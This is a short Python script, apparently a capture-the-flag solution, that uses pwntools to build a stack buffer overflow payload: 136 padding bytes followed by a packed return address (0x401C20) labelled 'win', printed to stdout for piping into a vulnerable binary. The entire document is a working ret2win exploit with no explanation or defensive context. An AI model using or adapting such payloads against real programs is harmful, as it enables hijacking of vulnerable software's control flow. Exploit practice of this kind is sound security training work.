import sys
from pwn import *
payload = b"A" * 136
win = p64(0x401C20)
payload += win
sys.stdout.buffer.write(payload)
